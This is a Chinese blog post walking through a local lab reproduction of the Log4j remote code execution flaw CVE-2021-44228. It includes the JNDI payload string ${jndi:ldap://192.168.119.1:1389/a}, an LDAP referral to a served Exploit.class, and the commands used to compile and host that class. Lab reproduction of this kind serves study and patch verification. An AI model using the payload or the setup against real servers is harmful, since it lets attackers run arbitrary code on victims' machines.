# Log4j 远程代码执行漏洞（CVE-2021-44228）漏洞复现 - rpsate - 博客园

> 原文：[`www.cnblogs.com/masses0x1/p/15780869.html`](https://www.cnblogs.com/masses0x1/p/15780869.html)

## 基本信息

漏洞编号：CVE-2021-44228
影响版本：2.x<=2.15.0-rc1
poc 地址：https://gitee.com/lcosmos/apache-log4j-poc
在此十分感谢我的寝室长 Cosmos 提供的 poc 和技术支持。

## 原理简述

当 log4j 打印的日志内容中包含${jndi:ldap://my-ip}时，程序就会通过 ldap 协议访问 my-ip 这个地址，然后 my-ip 就会返回一个包含 java 代码的 class 文件的地址，然后程序再通过返回的地址下载 class 文件并执行。

## 漏洞复现

首先安装 maven 依赖，并配置环境变量。安装方法请参考：https://jingyan.baidu.com/article/e4d08ffde8d4b24fd2f60dce.html

安装后执行`mvn --version`，如果出现版本信息则说明安装成功，如下图所示：

![在这里插入图片描述](img/8dfc16ade2d94b2ab0ba98e07ccb1b90.png)

然后更换 maven 源，因为 poc 所需要的依赖需要通过 maven 下载，更换成国内的源可以大大提高下载速度，更换源的方法可以参考：https://www.cnblogs.com/c2g5201314/p/14399714.html

然后用 ide 打开 poc 项目，在 Exploit.java 中写入要执行的命令，如下图所示：

![在这里插入图片描述](img/e1ea1db91a7768952c612b412c660e8c.png)

然后通过 javac 命令将 Exploit.java 编译成 class 文件。

```
cd src/main/java 
javac Exploit.java 
```

![在这里插入图片描述](img/8f287147987a807f455c661ddc6473f0.png)

需要配置一下 LDAPRefServer 文件，该文件的作用就是启动一个 LDAP 服务。如下图所示 1389 就是 LDAP 服务的端口，http://192.168.119.1:8099/#Exploit 就是 class 文件的地址。

> 上面 class 文件地址中#号必须加上，文件的 class 后缀需要省略。LDAP 服务返回 http://192.168.119.1:8099/#Exploit 就是让靶机去 http://192.168.119.1:8099 下载 Exploit.class 文件并执行。

![在这里插入图片描述](img/5542061897083611752ac54fd63e359b.png)

然后点击依次右边的 Maven 和 compile，这会自动下载所需的依赖包。等待下载完依赖后就点击 LDAPRefServer.java 文件中的小三角图形启动 LDAP 服务。

![在这里插入图片描述](img/6774e448c19d6446742258d9a8281c51.png)

然后来到 Exploit.class 文件所在目录下执行`python -m http.server 8099`启动 http 服务，也可以用其他方法，只要提供一个能下载 Exploit.class 的 http 服务即可。

> 注意 http 服务 ip 和端口要与 LDAPRefServer.java 文件中 ip 和端口对应。

![在这里插入图片描述](img/127b69f549f0b93d6068331c1657d10c.png)

然后运行 Log4j.java 文件，这个文件执行内容是通过 log4j 框架打印日志`${jndi:ldap://192.168.119.1:1389/a}`，其中 192.168.119.1:1389 是 lDAP 服务的 ip 地址和端口。然后就会发现命令执行成功了。

![在这里插入图片描述](img/5cbab79b32ea1b61af23b77317cc30bb.png)

## 参考文献

https://gitee.com/lcosmos/apache-log4j-poc/blob/master/README.md

https://jingyan.baidu.com/article/e4d08ffde8d4b24fd2f60dce.html

https://www.cnblogs.com/c2g5201314/p/14399714.html